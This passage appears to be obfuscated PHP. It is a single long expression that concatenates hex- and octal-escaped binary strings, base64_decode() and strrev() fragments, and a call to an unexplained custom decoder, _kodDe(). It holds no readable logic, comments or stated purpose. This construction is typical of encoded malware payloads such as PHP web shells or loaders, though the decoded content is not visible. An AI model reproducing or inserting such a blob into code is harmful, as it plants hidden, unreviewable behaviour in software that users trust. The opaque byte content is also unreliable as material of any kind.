16"."\x52\xb6\x5c\xf8\x83\x35\x93\x26\x2f\xda\xbd\x75\xc7\x6b\xbf\x5e\xfc\xa3\x33\x52\xb7\xcd\x39\x7a\xf7\x9\x67\x4c\xbe\xb0\x26\xb7\xee\xa9\xce\xce\xc7\x9f\xba\xe8\xf9\x83\x6f\xbe\xe4\xfd\xc6\x8f\x2f\x78\x37\xbb"."\xc7\x3e\x7d\x57\xbd\xb6\x74\x6f\xf3\xaf\xb7\x9d\x56\x55\x75\xcc\x9\xd9\x23\x56\xbf\xb8\x7a\xda\x3c\xcf\x9f\x2e\x89\xef\x79\xc6\xf\xef\xde\x1a\xd6\x1e\x7a\xe6\x37\xaf\x19\x1f\x8e\xf9\x5e\x1e\xaf\x39\xe7\x8e"."\x63\xcb\xaf\x3c\x68\xaf\x86\x6b\xbe\x17\x39\x62\x1f\xed\xf1\xfc\x6f\x43\xbf\x3b\xe5\xee\x83\xb6\x76\x6e\x39\x76\xd6\xc5\x3f\xaf\xec\x3f\xf4\x16\x6f\xd5\x21\xf9\x95\x99\x2b\x9f\x7f\xcb\x7e\xae\xf5\xa2\x8d\x7f".base64_decode('uWf5nMuOnp+76vwZV/zX9ytOeefR5w768fzzF+zh3/SDQ0+s/eCQoz+/oVXp+sU/lP2Peg==').base64_decode('8KGX2vbeeeUVZ+xXc1/+b3vOfPuA/h96njlu3yP2VTYcsmN8z6N/e9QDS9OPxs4qG/n85A==').base64_decode('SY8/d/shVzc+eYGx/+lrLoo+c8TnDS9f+2jTpIu/7Jyy7TcHRa74/owG+9gLp55VdslNvQ==')."\132\347\47\306\125\173\76\63\363\210\252\323\324\171\207\75\176\156\337\201\363\37\252\175\354\200\221\117\337\110\36\277\266\377\306\251\367\315\317\234\367\304\224\247\136\351\237\371\370\224\243\216"."\xfb\xe9\xa4\x1a\xcf\x31\xef\xad\xe9\x7a\xf9\x8c\xdd\xd1\xcd\x27\xbe\xfa\xc6\x2d\x5f\x6d\xda\xb6\xcf\xc1\x17\xae\xbe\xf9\xbd\x8d\xd3\x5e\x3d\xe8\xe5\xe3\x27\xfd\xd3\xf7\x71\xe3\xb2\x9f\xee\xdd\x1c\x9e\xbc\xf8"."\x88\xca\xc5\x6b\x7e\x34\xbd\xaf\xea\xe1\xd8\xb2\x33\x37\x2c\x1b\xed\x6d\x7d\xb1\xe2\xa6\xde\xf8\xc9\xf\xc4\x17\xdc\x3a\xef\xde\xe8\x4d\x2f\xd5\xbc\xfa\x9e\xb7\x75\xe1\xa6\x6c\xdf\x9b\x2b\xee\x78\x64\xd5\x96"."\x3\x73\x67\xfc\xf1\xd0\x99\x17\xdf\xbb\xa1\x32\x3a\xf7\xed\x73\x6f\xf4\xad\xaa\xfe\x32\x18\x58\x71\xce\x5e\xa9\xe7\x96\xdf\xf6\xca\xca\x23\x4f\xb9\x79\xc3\xc6\xaa\x40\x74\xdd\xf3\x2f\xbe\x73\xce\xd3\x8f\x1e"."\60\126\170\362\120\317\43\7\376\156\137\363\226\267\73\167\374\42\377\372\36\57\114\171\66\163\344\102\343\350\355\326\253\353\317\353\375\361\314\306\47\367\65\317\173\257\243\166\373\124\353\372"."\xfd\xbe\xb8\xe5\xb4\x33\xde\x3e\xf1\x8d\xc4\xdd\xd\xa7\x9c\xf4\x66\xe0\xf0\xc8\xe4\xd7\x7f\xa6\x6e\x5d\xf8\xd8\xdc\xfd\x8e\x7f\x6b\xce\x9f\xe6\xde\xbc\xe6\xd8\xe7\xbf\xab\xac\x7f\xeb\xd7\x7\xb7\xff\xea\x96"."\xcc\xf8\xf6\xfb\xa7\xff\xf1\x8e\x1f\xe\x5d\xa0\xcd\xfe\xcb\xb6\xdc\x3b\x4f\xbc\x73\xda\x52\xfd\x57\xb9\x37\x2e\x33\xd4\x95\x77\x9d\xfa\x71\xe1\xa7\x17\xad\x79\xff\xfb\x53\xf6\xba\xf4\xfe\xdf\x8c\x3e\xac\x3f"."\165\317\337\32\37\334\22\74\355\221\12\337\357\176\361\307\127\236\77\350\221\313\67\377\167\307\17\167\337\372\306\356\333\36\76\157\351\41\7\177\371\227\354\43\157\275\372\340\53\47\334\333".base64_decode('sXufSY2P9qcuuHPe+g2HVZ8wfP/L6RVH9jf//YFpB+/bfvH5Ww548Ts/qj992/0nD3/UnQ==')."\355\152\172\355\360\333\357\254\175\170\207\171\362\71\375\325\77\76\363\332\57\27\35\254\133\123\17\376\172\323\266\13\357\170\172\373\253\227\377\365\272\355\17\335\150\354\365\203\273\206\222\277"."\276\377\261\7\277\227\233\67\255\376\310\147\366\62\166\276\126\377\300\103\303\357\317\125\337\332\176\333\221\17\174\366\257\337\276\367\273\67\356\272\274\143\371\363\47\337\374\330\207\155\73\316".base64_decode('vKrrX2OvP3H9T4Y/e++jlZuvP/Grz96d94LaueOkf3/4yvv+F9Sv3v/XaYcffv1Xuz8ZvQ==')."\xe3\x99\x25\x5f\xad\x3d\x25\xf2\xc5\x47\x7\x3d\xf2\xc5\xbf\xaf\x3f\xe0\xa9\xeb\xae\x7f\x62\xf7\x2f\x83\x3f\x6b\xb9\xf5\xaa\xa5\x1b\x1f\x6d\x7a\xe3\x94\xcb\xfe\x36\xd2\xb9\xff\xc9\x17\x3f\x7b\xf0\xba\x17\xd7"."\xff\xee\xd4\x69\xb\x1f\xbd\xe1\x9e\x49\x5f\x1c\x68\xdf\x75\xc4\x7f\xed\xbd\xeb\x9d\x3d\xd6\xcd\xf8\xdb\xd4\xcb\x9f\x3a\x69\xdf\xcd\x5b\xef\x4b\xff\xf4\xec\xc2\xf7\xf\x39\xff\x81\x4b\xd6\x1c\xf4\x5c\x68\xcd"."\x3e\xbe\x43\xcb\xf3\xfb\x1e\x75\xcc\xef\x3e\xb9\x31\xfa\xb3\xba\x97\x6a\x1f\xdf\xb8\xe8\xf8\x1d\x5b\x7f\xf5\xf9\xd0\xee\xcf\x6f\x5f\xf1\xec\x59\xf7\x5c\xfb\xcc\xe6\x25\x27\xae\xee\x78\xf3\xad\x3b\x3e\x9b\x1e"."\374\303\374\320\25\207\77\267\265\66\63\345\361\113\156\232\262\143\325\376\67\335\360\313\37\35\267\371\250\333\177\67\351\367\307\376\375\373\312\354\363\367\30\236\76\365\236\346\133\122\77\114"."\354\266\326\75\372\354\256\163\117\230\262\127\120\331\25\176\355\351\133\53\372\377\262\345\350\320\326\367\76\353\236\227\174\343\323\256\303\17\271\346\345\175\33\117\32\377\343\153\57\36\263\345"."\xe6\x9b\x3e\x9c\x14\xbb\xa8\x6d\xfe\x5f\x3e\xec\x38\xf1\xcd\xb\x36\x3d\xd3\xfd\xda\xb\xff\xbd\xe8\xcf\xff\x38\xed\xda\x60\xee\x5c\xeb\xcb\xba\xc6\xeb\x57\x7e\xf0\xf4\x4b\x93\xae\xd6\x67\xed\x38\x63\xc9\x55"."\xef\xed\x3c\xe9\xb6\x7f\x6e\x99\xfb\xda\x8c\x5f\xfc\xf5\x83\xf\xb6\x8d\xf\xfe\xee\xba\xd5\xd9\xed\xf7\xe\xae\x78\xea\x4f\xa7\x3d\xbd\xe2\x91\x97\xa6\xf\xae\x3d\x22\x5a\x7f\xe6\x11\xeb\x46\x96\x5c\xfb\xab"."\xf2\x3f\xbc\x7e\xf3\xf6\xd8\xee\xbe\xec\xbd\x2b\x2\x55\x73\x5e\x7f\x76\xfe\xfa\xed\x47\x2e\xec\xba\x74\x60\xe1\xbf\xae\xbb\xeb\xda\xbe\x3b\x66\x3c\x71\x7c\xcb\xa1\xeb\x8f\x3f\x7d\xf9\xea\x1f\x1f\xfb\xf4\xb4".strrev('û—£³òMcü¦X¯ÊF{¯|a·]N÷Ôv=G-Ù#oÿ·¿†ißŸ®Îü9Ÿ«óá½°<ßÓ')."\237\50\174\364\111\240\371\340\221\263\366\122\73\233\356\374\144\131\337\176\265\373\64\77\60\105\131\250\277\65\155\347\36\7\36\264\176\132\337\147\253\353\353\76\256\74\360\73\363\76\176\347"."\350\365\207\304\56\237\225\61\267\75\336\32\71\45\265\145\307\157\152\316\173\346\235\133\357\234\374\335\155\267\254\372\153\313\215\163\266\156\274\304\237\374\363\232\67\273\357\371\371\153\107\374"."\xf8\x86\xa9\x7f\xf8\xd1\xab\xeb\x3f\x98\x11\x3c\xfc\xda\x75\x5f\xbc\x7e\xe8\xc8\x47\x67\xdd\xd1\xb9\x59\xbf\xe6\xf8\xea\xa3\x9e\xef\x38\xe0\x57\x1b\x4f\xff\xf8\xfc\xaf\x57\x1e\x17\x5a\xf6\x79\xa5\x76\xcf\x67".base64_decode('t3uvPvOI+jf3P+7GxfbLT379Sc/cjU+/Oun5zt/8KPjLqw+IXv2dg24+u2rPA5ZaL3zy+w==').base64_decode('D95/+ewnl752+7u3a/vph3x406tPeXZdXTe547yf/2q/VSfv+/3Vd1rVzannzxtdtezejg==')."\x46\x6d\xcb\xf2\x97\xe6\x1d\xbd\x36\xf5\xf9\x7b\x7f\xf8\xaf\x85\x57\x6f\x3d\xc0\xbb\xf8\x1f\xff\x9e\xbb\xb8\xe6\x8d\x63\x16\x3f\xb5\xed\x48\xa5\xe7\x87\x17\x7c\xfe\xf9\xf1\xbb\x27\x5d\x73\xd8\xdd\x2b\x32\xaf".base64_decode('TNs095pr73yspeZ77zy8Nfn883u9Vr9z/JPt/3P5Cf19hd1/Ty5/+bClHw03f/lo9fg1+w==').base64_decode('Tl5d9puaZy/Zb2TxfTefOpL+VDvu0kdPWrFpe77jzvVnn/zuU7Gff/fDs7666dLY040Hfg==').base64_decode('kjj02Mfef29Hy8zDXp40/McrDg5+ctgT2uW/nrLP4z+ruXhvvf2Bka9eOLdHPfFfX229ww==').strrev('â|Ü¯úïñ|Ö_×å~0şW‹ç>÷‡…ü|¢{¿¯‘ÛÁñş“Õc¦Ëóyÿëür¶ş¯†Ò').base64_decode('iSd98usvza9zX/39zCvVf7/z3qeRr79+64Wh1Ye/8q/aV5+3J1eN3fnWp71tM80/7/j73A==').base64_decode('t9b/T6326e78LSf86fW7Pto974Br7hr45Z/eP/aYo9/6yccH7md/95rHLy5UN9532puT/g==')."\x7e\xeb\x4f\x6a\xae\x7b\xee\x85\xea\xd7\x3f\xeb\x3c\x29\xb9\x75\x4b\x7b\xf8\xcd\x7f\xdf\xfd\x62\xfc\x8b\xe3\x6f\x5e\xb3\xf8\xbc\xc9\xf6\xf7\x7e\x36\x7a\x72\xd5\x31\x7d\xd3\xf6\x3d\xec\xb9\x15\x7f\x9f\x3a\xe5"."\210\125\325\163\17\260\253\257\74\342\300\232\345\117\314\135\123\365\365\141\357\157\230\323\364\311\241\354\62\333\202\231\160\206\12\146\116\111\253\73\63\314\314\30\341\52\116\42\143\15\145\173"."\x1\x6\xa6\x62\xc9\x41\xbb\xcf\xec\x7\xed\xd1\xec\xf9\x90\x7b\xe6\xec\x6a\x10\xf7\x32\xc3\x85\x5c\x2\x84\x58\x50\xb2\xcd\x99\x7\x58\xd5\x60\x1e\xc9\x70\x7\xb2\x43\x16\x93\x5d\xe7\xb1\xfa\xf4\x22\x41\x3f"."\x63\xc3\xee\x71\x5d\x62\x28\xa7\xf7\xac\xa5\x11\xb3\x5b\x2f\xc\x24\x20\x65\x28\x9f\x59\xdb\x57\x0\xfd\xd4\x7c\xf6\x85\xb9\xf3\xa0\x14\xbb\x3f\xd1\xa7\x77\x83\x4a\xa6\x7a\x16\x8\x7e\x7d\xa6\x95\x4d\xc\xc2"."\xb1\x75\xc2\xca\xf\x6b\x3d\x50\xdc\xfc\x6a\x68\xf3\x40\x22\x9b\x1c\xce\x43\xa5\x6\xb\x89\x7c\x3a\x5\x28\xa9\xde\xbe\xcc\xba\x4\xbb\xe6\x91\x1b\xc8\xf\xae\x4d\x40\x37\x30\x3b\xba\x59\x73\xa0\x85\x33\x17".strrev('Y¬yœîw»1—/²`ô3Z3‘8Yk­–ÓÈ±7²@ğÎ­‡ìÛ¶s«7v1êŸ @')."\360\21\155\250\77\223\114\201\332\162\356\354\5\40\250\367\45\206\322\114\317\67\157\16\264\157\366\74\250\153\176\60\221\135\153\102\137\254\135\67\154\346\62\260\21\235\3\175\130\75\173\16"."\153\26\100\122\75\5\335\34\206\315\112\237\61\144\367\254\203\56\326\163\75\326\160\77\64\240\167\110\353\357\113\3\332\160\102\327\222\51\250\173\365\174\326\123\263\240\226\103\331\165\246\236"."\x2\xa9\x7e\xe6\x5c\xa8\xe5\xbc\x5\x2c\xd9\xca\xe\xf4\xaf\x33\x19\x69\x24\xd3\x3d\x43\x40\x5c\xf3\x66\x41\x51\xfd\xb6\x99\xb5\xba\x81\x46\xaa\x17\xb0\xf\x2c\x80\x3a\x27\x7b\xb4\xee\x5c\x96\x67\x82\xae\x9d"."\xc7\x86\x6c\xce\x5c\xd6\x1f\x3\xc9\x74\x6f\xc6\x60\x4\xc5\xba\x18\xba\x60\xde\x3c\xe8\xeb\x39\xb3\xc0\x78\x6e\xc1\x5c\x36\xd6\x73\xe7\xb1\x3e\x6\xc8\x50\x72\xa0\x7f\x6d\x1f\x8c\xc7\xba\xbe\x6e\xbd\x7f\x10"."\324\302\163\147\316\143\201\52\326\21\320\344\114\167\172\60\145\203\262\255\167\170\155\137\312\206\301\311\364\365\16\33\131\350\301\331\354\153\166\322\350\353\146\364\263\240\12\240\5\104\157\31"."\x9b\x8d\x43\x5f\xb7\x66\xe7\xd6\xc1\x87\xc4\x17\xa1\x5\xdd\xda\xba\x42\x9f\x9\x3d\x33\xa8\xd\xe4\xf4\xc\x7c\x7e\xf6\x1c\x98\xa2\x49\xbb\x67\xa8\xb7\x1f\xb6\x64\xb3\xab\xd8\x3c\x9e\x3b\x9f\x35\x1d\x3a\x2f"."\75\234\314\15\145\240\305\63\371\74\147\263\140\250\327\110\145\164\110\356\37\64\6\62\353\200\56\27\314\203\346\317\257\236\311\2\320\224\5\363\241\357\7\372\326\132\231\334\20\253\32\324"."\x3e\x97\x48\xe9\x83\x69\xa8\xfd\xfc\xd9\xb3\x59\x32\x1b\xd7\x5\x6c\xe4\x58\x6d\x12\x6b\x8d\xee\x7c\x4f\x3f\xfb\xa\xab\x23\xe3\x5c\xc3\x96\xd1\xdf\xa7\x41\x7\xe8\xc6\x40\x62\x30\xb9\x96\x8d\x3d\xd4\xd1\x4e".base64_decode('D/YkDc5UoLWsmnZ3T2qwD9o1f/4sNjJAyevy/dpaHcofMgdSiW7gJXVaso9pfrm1rmzmSg==').base64_decode('Dbaoik0+KmFXH42sL6NlubFMMwy/DOvTdWYwD0zLFgYYYGELcCOjC202PTNgOcX2HOtGJA==')."\x13\xe\x1c\x8d\xc9\xa5\x24\xb3\xb6\x94\x8c\x62\x8e\xd4\x98\x6c\xd3\xf\xad\xc3\x35\xf4\xc9\xad\x5e\x9d\x61\x73\xb4\xc4\xd9\x23\x68\x70\x2d\x6b\xd0\xcc\x43\x8f\xf5\x99\xa9\x64\xda\x2c\xa4\x1c\xa5\xa6\x12\xbe".strrev('õf¶ñ•@äHI±öÅÎüØVÂ×‰zoP?á[”FA-z9ƒ:í‡@¢>†ç'."\r".'Û¥*R[I=')."\371\144\260\127\116\65\262\250\276\351\264\317\171\255\33\337\257\156\157\123\343\201\330\62\311\132\17\337\377\145\264\243\212\213\11\122\73\304\240\111\75\50\217\235\263\315\214\66\166\155\336\76"."\x7a\xe1\x15\x63\x97\x6f\x19\x3b\x7f\xd3\xe8\x83\x97\xee\xda\xb4\x65\x74\xc7\xe5\x28\xba\x73\xdb\x5\xa3\x9b\x7e\xf6\xee\xd5\xa7\xef\xdc\x76\xfe\xce\x6d\x27\xef\x3a\xf3\x9e\x8f\x1e\x3a\x6f\xf4\xc2\xcd\xbb\x4e".base64_decode('2zG68dbRm8/cuX3HrkfOHL/13J3b7hrbePbo6fft3H7F6Fk3jJ554dil5+/csRHhj50lSg==').strrev('Ä’˜õim)òİE ‹*A°LÌ<¶%mÒm‰`Õ0)Ğô~§•¼n»m¶èêt>ó…]w£hF')."\227\235\260\275\226\335\253\347\25\233\330\155\151\350\157\326\314\172\51\251\321\53\351\226\142\144\161\262\302\372\332\307\311\61\256\147\162\230\250\240\227\374\364\156\252\343\6\204\104\171\245\272".base64_decode('mSaUoCPc12KsKnAQjuCwok/p1hAgVaN0o2wKu4Gl2CYLZ4b5oLvIv+Sw8mqwoe3h+nahBg==')."\x86\x8a\x49\x57\x5b\xe8\x19\x4b\x11\x49\x91\xf9\xe4\x64\x6\x8e\x99\xe6\x64\x23\x72\x92\xb3\x27\x40\x4f\x4b\xcc\x5\x3c\xa\xad\x8a\x47\x21\x87\xc4\x8a\xf3\x22\x36\x3e\xfe\x67\x47\xea\xf2\x9c\x91\xab\x9f\xd7".strrev('æœCèÎô*4º¢õ$½8™X>³'."\r".'ë*½Ê K°Xù¢$pâî‰X„ÕÑ;%U„Z~is')."\365\224\301\14\211\365\14\301\4\16\350\223\116\175\350\155\45\156\315\234\104\144\237\167\34\150\55\132\222\353\315\141\257\26\366\302\45\140\126\317\256\255\111\165\200\260\270\175\45\103\323\356"."\103\62\76\111\32\352\44\337\22\30\255\306\353\365\112\312\134\141\115\206\103\120\234\70\53\106\260\40\236\301\23\301\33\270\11\5\232\332\75\75\272\145\327\220\113\254\312\14\5\125\164\276"."\x6f\x26\xa\x90\x49\x30\xc7\x37\xf\x5\x49\x8f\xc1\xc4\xed\x84\x5e\x2c\x58\xec\x4a\xd1\x54\xdf\x6c\x90\xd6\xad\x85\x60\xff\xb1\x90\xf0\x8f\x5a\xa9\xfa\x0\x17\xb9\xa\xd9\x34\x83\xa2\x20\x42\x89\x16\xb2\x78".strrev('-ˆ°5F×†dåïÚ€4œ[y`@A¥ê_jà§®‘ÚÑ>©Ğİª¥Ki-BÓ))³Ömœk´').base64_decode('KqwaUKQl3fmPCorC2Ul3fUNWWx7yXNLMZrkRqpXW2GGjhS/HZHVOfwVLmOBrgmvgkJjONA==')."\5\337\206\16\111\227\72\124\264\312\133\22\276\332\243\333\354\342\13\324\273\56\20\13\325\253\155\1\166\125\103\313\345\374\126\252\317\362\143\173\112\143\100\17\33\11\77\366\57\200\51\324"."\xc7\x6f\xe0\x93\x55\x40\xd5\x12\x66\xde\x66\xfd\x87\xe6\x8d\x9a\x32\xa0\xa2\xe1\x50\x9d\xda\x10\x8a\x4a\x5f\xce\x15\xdc\x5f\x96\x7d\xc1\x4\xda\x42\x6a\x2c\x16\x91\xea\x41\xae\x36\xaf\x52\x97\x45\x1a\xd4\xfa"."\110\144\131\10\246\204\40\42\156\213\121\43\161\155\174\273\122\234\176\343\230\270\145\211\117\214\144\163\67\131\40\302\216\73\360\322\37\123\300\54\24\315\303\372\346\100\224\33\343\317\361\125".base64_decode('+WYKXPRBFV9GqGWeAGLxQLSE+xbq1gWIBVy5QIbmyEqlPhJub2mNUa8lFN4akdKJyTUkMw==')."\347\56\305\311\120\174\260\55\34\250\17\52\241\326\170\204\135\246\340\126\257\344\32\115\214\307\131\27\344\55\235\73\157\201\374\64\42\137\365\221\113\344\45\301\364\352\360\224\167\226\165\116"."\xef\xac\xe8\xac\x5c\xe3\xeb\xb4\xba\x80\x11\x92\x11\x31\xe4\xe1\x81\x48\x5b\x3\x34\xaf\x86\x87\x52\x16\xd0\x54\x4b\xc\x9\x20\x34\x18\x89\x6\xea\xc3\xac\x2a\x88\x42\x21\x18\xa9\xf\xd1\xc0\xf8\x65\x77\xef"."\x7c\xf0\x82\xf1\x6b\x37\x8d\x9e\x7d\x3e\x2a\x68\xec\x9a\x53\xc7\xae\xbc\xf\x89\x4d\x58\x54\xda\x74\xde\xf8\xc3\x17\x8c\x5d\xb6\x79\xec\x3c\x10\x71\x94\x5d\x9b\xef\xdf\xb9\xe3\x91\xf1\xcb\x6e\x1d\xdd\x74\xd5"."\330\25\17\214\137\363\123\232\360\356\155\167\217\236\163\53\257\230\362\356\245\17\217\135\160\13\27\237\250\324\344\101\271\337\75\375\374\361\35\233\260\360\164\323\311\143\367\236\73\266\361\374"."\321\163\156\34\275\372\326\361\13\66\217\376\374\264\321\63\316\337\265\371\362\311\156\102\242\361\16\66\24\160\301\333\177\42\276\234\117\273\267\323\232\201\273\266\22\375\126\340\53\32\350\227"."\131\232\23\353\343\345\355\301\326\372\240\373\256\223\34\5\317\67\323\51\205\120\113\34\220\227\55\360\234\303\342\304\113\106\155\371\204\265\30\201\361\227\52\45\125\246\41\30\253\217\206\352"."\202\160\11\200\17\324\124\42\353\201\35\6\202\306\242\53\170\230\137\216\55\362\124\244\124\60\142\256\124\34\15\321\174\111\63\135\310\144\111\145\225\62\154\26\126\346\301\234\207\134\274\122".base64_decode('yvA6jwA6vtJfgX2YECPi8tXlnirPzEoF3BjRHOC8SCkDW3Sez/ERT8IRm+mpqlTKcn1lUA==').strrev('~¤ÄàÚĞ%0Ü0„ã äO¤¢C‡_£óÄ=$§V f¼ì³gp+«–SÍ´Å*ö¨¯Ñ/')."\214\332\312\211\15\147\322\147\163\147\50\154\230\313\53\225\4\134\255\50\221\110\262\71\72\243\326\321\31\25\63\200\117\264\65\361\361\246\367\46\24\172\237\216\126\113\263\330\100\1\224\14"."\x15\x86\xd2\xd1\x62\xb8\x26\x6a\x6\x1a\x1c\x8a\x8f\x2\x3c\x5\xdf\x30\xe0\x25\x21\x76\xc4\x13\xd8\x8\x62\x38\x1f\xc4\x12\x69\xc4\xc1\x54\x19\x95\x47\x69\x3b\x33\x56\xf\x63\x75\x70\x71\xbf\x65\x35\x6f\x3"."\xa3\x65\x18\x2\x5d\xb8\xa7\xc2\x37\x3\x83\xf1\xfa\x66\x4a\xe5\x31\x89\xcc\x53\x89\xa9\xe\x42\x15\xdd\xa9\x38\x48\x84\x6f\x6a\x0\x8f\x4e\x17\xcc\x10\x26\x11\xbc\x50\x6b\x63\x24\xda\x42\x6f\xc4\xc5\xea\x9b"."\203\55\1\37\60\161\112\11\24\37\113\200\112\255\122\216\71\37\5\225\73\272\237\174\210\165\131\234\174\25\315\53\325\106\342\34\355\205\134\17\124\6\106\137\41\36\10\64\222\245\266\234"."\72\211\201\42\271\37\265\110\64\256\242\16\0\366\54\161\335\162\151\265\220\14\316\361\375\256\1\266\33\351\106\362\231\311\334\335\244\22\314\335\32\52\34\227\131\37\151\155\14\261\313\177"."\15\11\50\57\145\72\220\32\242\41\354\3\4\276\257\260\242\244\53\227\50\42\254\76\120\44\67\230\342\141\341\126\1\47\360\65\37\105\304\222\217\42\174\261\301\130\222\137\70\374\375\130"."\53\17\13\21\34\105\332\143\354\356\7\346\276\53\33\170\270\231\337\200\307\11\221\250\24\11\104\3\55\61\36\215\256\344\167\111\70\214\336\51\121\133\333\133\4\307\17\7\126\40\142\211"."\xb0\xfe\x66\x7b\x24\xff\x89\x15\xbe\xe9\x4b\x2a\x3b\xe9\x35\x3d\x1a\xa4\x3f\x4b\x59\xc\x5f\x5d\xea\x5a\x3f\xd3\xa3\xcc\xdd\x50\x9\x38\xdc\x97\x86\xdd\x8b\x44\x25\x55\x7c\x65\x79\x58\xd\x47\x9a\x68\x9c\xf8"."\253\13\146\123\142\307\244\164\50\110\40\217\13\201\334\142\113\27\237\15\12\242\141\205\136\372\125\132\43\53\3\302\5\232\224\0\20\341\21\315\177\142\107\347\140\247\17\11\13\326\32\161"."\355\256\241\116\141\142\10\161\243\2\12\10\310\35\140\313\350\32\17\254\30\152\332\354\141\16\216\20\103\34\1\161\201\376\256\142\1\302\53\41\103\222\134\210\36\342\225\10\170\117\120\73".strrev('`ùk‹¢Q.Ø‚,-gD!+QÒ‚ò¸•MEÇ1ccZpjJ¢=:^#®ô}zu§:G')._kodDe('Ln+HkqQ9r4Hh6hA2C9EvCihzHpATCRkd/n77b9AyNN8Vaji5lRGJKsTucvw1FFbaxJweCB4=')."\137\31\14\122\4\26\206\137\201\212\30\16\64\125\362\147\210\357\27\100\262\270\157\0\105\253\152\5\351\114\157\327\214\112\125\365\133\355\100\57\334\131\110\105\371\224\231\345\260\206\4\142"."\365\43\234\373\72\10\242\230\26\310\155\0\47\41\160\57\175\20\157\212\106\332\333\244\170\163\140\105\250\265\211\305\374\323\131\150\72\24\255\64\204\142\250\213\352\31\61\12\347\201\162\234"."\206\251\130\44\113\275\16\222\156\100\234\35\105\44\221\35\157\6\50\147\166\316\262\272\366\120\270\101\276\224\216\21\151\150\52\341\352\260\246\114\145\225\143\161\162\75\235\105\160\227\263\60".strrev('³ª>Áæ“É	S•Ëğ'."\r".'«ÚClöŠïhielwx"ÊB,…\'‹tŒX´"À}!7!')."\xc3\xfe\x64\xd0\x8e\x4e\xe3\xfa\x59\x97\x9a\x95\x68\xc8\x24\x85\x4\xb5\x10\x54\xa4\xcb\xdd\x58\x5f\x2b\x69\xb5\xfc\x14\x3\x9\x9f\x4\x7\xfd\x76\xae\x59\x42\x84\xe3\x35\x8c\x4e\xe9\xbd\x62\x3b\x6e\xd8\x69"."\307\107\341\376\41\372\150\210\134\372\224\76\313\56\150\20\365\244\152\112\312\161\262\156\313\0\241\20\243\232\164\320\45\13\175\23\66\224\44\132\146\32\165\356\250\70\233\132\303\67\112\340".base64_decode('mMEDv1Cj/elPJ0SZbqUTPlLugUW3kwnsHZ1DVVVe9M989LcO/a1Hf4MY0Ng5NK8RBRY0dg==').strrev('•HÑ'."\r".'â/uTæ\'‹döôÃ;TnÅì™ÊÑÿ ¹e2Ñ'."\r".']`@dê&Ë;;·îpïİ„Èáù')."\143\224\120\243\102\275\75\50\345\124\331\137\16\2\132\175\64\210\347\30\305\142\151\25\345\16\145\333\342\162\5\156\200\127\72\163\205\132\33\202\253\224\162\43\65\244\152\232\12\231\25\64".base64_decode('o1lBSlFJrARaVziBsnrNQUUmUrbrrqewuCDcIgGP+G1gt209sLXnKVSupkmhGFr2w2HSUg==').base64_decode('lGRYWBz2KNy9AgbiLQxV3EJBLIEWRJOCq+LRAAYSGXafSegPYUt4j5XPaPQKKpH8fGtA1Q==')."\260\306\41\150\122\21\24\213\232\100\167\144\341\224\332\304\123\210\276\201\166\263\254\215\130\6\262\73\215\265\105\103\55\201\350\152\350\62\261\223\200\211\153\246\35\27\221\105\304\260\332\245"."\xab\xf0\xad\xa8\xd6\xf2\xd5\x78\x3a\xc6\x23\x8c\x4f\xa3\x5d\xf1\x8\xf0\x69\x54\x1b\x1a\x2c\xc3\x23\x4f\x83\xe0\x99\x56\xe5\x37\x9d\x99\x2a\xa6\x2\xe8\xb8\xcc\xc3\x2\xcc\xd5\x4\xb9\x85\xc5\xf4\x70\x19\xc4"."\xb8\x78\x4c\x8c\x1a\xd0\x3e\x8c\x8a\x9c\x2a\xdf\x23\x13\xae\x73\xf1\x52\x8b\x7\x19\x26\x40\xb0\x31\xd0\x1e\x96\x21\xd0\x55\xca\xb2\xe0\xea\x6f\x98\x23\xac\xa6\xa5\xe6\x8\x4b\x63\x4a\x1d\x3e\xdb\xa0\x3d\x15"."\163\240\175\324\11\106\105\65\332\331\26\262\330\135\16\367\316\11\265\242\261\100\173\74\242\242\125\50\32\304\153\2\264\210\167\253\124\137\151\367\56\17\12\24\203\21\270\37\342\157\150\32"."\303\51\325\64\236\237\353\257\202\255\115\241\326\140\155\313\160\50\26\150\121\130\305\101\103\207\175\162\316\207\162\102\21\65\214\44\153\125\126\302\205\42\240\302\166\70\174\124\125\341\101\305"."\247\11\233\163\73\137\220\334\347\31\46\261\357\156\341\127\101\210\101\72\42\210\200\160\240\300\325\354\44\255\220\300\271\345\105\17\362\273\374\252\32\146\15\116\301\310\124\326\131\50\320\125"."\307\307\335\6\335\62\130\330\232\213\163\150\166\324\315\335\357\101\206\166\311\1\2\316\254\260\17\222\363\250\254\263\172\150\231\115\63\27\130\252\56\132\223\321\55\213\237\107\307\173\165\305"."\312\351\111\342\310\123\1\367\163\112\312\324\55\341\371\33\372\236\354\266\130\320\356\25\256\42\144\17\270\15\165\254\223\13\131\73\246\247\341\170\241\41\101\214\372\305\365\73\161\335\111\62".base64_decode('9ienRGLkqF8/V0YoKcS7RsISwLBweYsPZUSZXUxnIPpjncEWQfcxJq9k1mzT8xmDnEStFA==').strrev('Ñ'."\n".'G|¯ôY'."\n".'Z7JÅhq/wIš‘Ÿ¼ÈcMñ‰v&eéñ×¹>Wûøè Î°M').base64_decode('SrcymBNEGpsHRjOIPiHQAxD2m2cpPuFCh5SJpSqvcGmR0uTrqJLv+MkypZAhF7Tdbcj+LQ==')."\174\302\153\60\237\56\113\371\100\341\153\332\140\17\200\5\366\156\125\252\113\33\307\27\376\102\151\157\110\303\100\0\64\110\46\270\122\43\52\321\154\140\372\37\226\150\107\202\266\60\167\117".base64_decode('4LM4bIJoja+V6Db4FHPwp1AE8vp0fEeL3pgJcpePKCN1jPftmdolt80TsJSS+eoBkX8wTw==')."\224\116\337\376\301\250\56\126\175\224\215\134\211\373\326\114\202\305\222\57\221\114\22\133\166\345\41\344\110\257\357\300\310\367\102\262\240\61\264\26\264\106\324\146\264\334\104\230\120\142\130\161"."\7\173\147\271\200\205\330\110\146\112\372\311\5\143\330\70\56\44\47\135\364\4\26\6\173\75\342\334\74\304\254\125\300\173\230\20\6\2\364\147\165\46\345\105\25\7\252\113\351\66\167\336".strrev('5~°hÔ¶ëpxÎÊ=¤X´£â*ƒÅ) }Še©|tÕiù(;pÎÏ],ë‰˜» ¹„').strrev('BÊE¤Ñ &JË­C†¦¯ÇÜÍb]†